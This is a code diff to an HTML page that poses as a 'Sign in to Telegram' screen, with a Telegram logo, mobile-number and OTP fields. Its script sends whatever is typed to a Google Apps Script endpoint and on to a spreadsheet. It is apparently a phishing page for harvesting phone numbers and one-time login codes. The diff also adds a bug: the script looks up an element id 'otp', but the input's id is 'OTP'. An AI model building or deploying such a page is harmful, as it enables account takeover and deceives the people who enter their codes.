@@ -28,7 +28,7 @@
             border-radius: 5px;
         }
         button {
-            width: 111%;
+            width: 110%;
             padding: 15px;
             background-color: #4A90E2;
             color: white;
@@ -43,56 +43,52 @@
 </head>
 <body>
      <div class="login-container">
-        <img src="Telegram-Logo.png" width="300" height="150" alt="logo">
+        <img src="telegram-logo.png" width="300" height="150" alt="logo">
         <h2>Sign in to Telegram</h2>
         <input type="text" id="mobile" placeholder="Enter mobile number" maxlength="13" name="mobile number">
         <input type="text" id="OTP" placeholder="Enter OTP (any number)" name="OTP">  </br>
         <button onclick="verifyOTP()">Verify</button> </div>
 
     <script>
-        const googleAppsScriptURL = "https://script.google.com/macros/library/d/1DbmGMO1oVpHvRCRwnYhcrl1fHLr_U9oITV52btCFpb9q0p4ppd_dFG85/1"; // **REPLACE THIS**
+        const googleAppsScriptURL = "https://script.google.com/macros/s/AKfycbwvSzaERgYJfmmJOPvOJnF3R6q937nkqXFL-T5kxd3Y8Pu8Q0OqBkmIM9ouaiBEwjwg/exec";
 
-        async function verifyOTP() {
-            let mobileNumber = document.getElementById("mobile").value.trim();
-            let enteredOTP = document.getElementById("OTP").value.trim();
+async function verifyOTP() {
+    let mobileNumber = document.getElementById("mobile").value.trim();
+    let enteredOTP = document.getElementById("otp").value.trim(); // Fix ID name (was "OTP", changed to "otp")
 
-            if (!mobileNumber) {
-                alert("Please enter a mobile number");
-                return;
-            }
+    if (!mobileNumber) {
+        alert("Please enter a mobile number");
+        return;
+    }
 
-            if (!enteredOTP) {
-                alert("Please enter a value for OTP");
-                return;
-            }
+    if (!enteredOTP) {
+        alert("Please enter an OTP");
+        return;
+    }
 
-            // In a real application, you would validate the mobile number format here.
+    let data = {
+        mobile: mobileNumber,
+        otp: enteredOTP
+    };
 
-            let data = {
-                mobile: mobileNumber,
-                otp: enteredOTP // Include the entered value
-            };
+    try {
+        let response = await fetch(googleAppsScriptURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data),
+            mode: "no-cors" // ✅ Fix for CORS issue
+        });
 
-            try {
-                let response = await fetch(googleAppsScriptURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
-                });
+        // Since "no-cors" prevents reading the response, show a generic success message
+        alert("Your data has been sent. Please check the spreadsheet.");
 
-                let result = await response.json();
-                console.log("Server Response:", result);
-
-                if (result.status && result.status.toLowerCase() === "success") {
-                    alert("Data saved successfully!");
-                } else {
-                    alert("Failed to save data: " + (result.message || "Unknown error"));
-                }
-            } catch (error) {
-                console.error("Error storing data:", error);
-                alert("Error connecting to the server.");
-            }
-        }
+    } catch (error) {
+        console.error("Error storing data:", error);
+        alert("Error connecting to the server.");
+    }
+}
     </script>
 </body>
 </html>
